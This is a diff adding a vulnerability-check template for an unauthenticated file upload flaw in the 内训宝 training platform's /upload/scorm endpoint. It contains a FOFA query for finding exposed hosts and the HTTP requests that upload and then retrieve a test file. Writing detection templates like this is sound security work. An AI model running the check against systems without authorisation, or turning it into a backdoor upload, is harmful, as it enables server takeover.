@@ -1,0 +1,41 @@
+## id: VEID-2025-0108
+## name: 内训宝scorm存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2025
+## description: 内训宝企业培训平台 upload/scorm 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+## fofa-query: body="static/nxb/css"
+## verification: true
+
+
+POST /upload/scorm HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk
+
+------w80tipyzy4xm9y5cb2zk
+Content-Disposition: form-data; name="fileupload"; filename="veil.txt"
+Content-Type: application/octet-stream
+
+hello veil
+------w80tipyzy4xm9y5cb2zk--
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "plain"
+#> extract: name=txt_path, from=body, regex=/(\/[^\s"']+\.txt)/, group=1
+
+---
+
+GET {{txt_path}} HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: 3047ec40b69fe4b65f309e437df2cb1261656bd3cf3a3868ece8197752d4406b
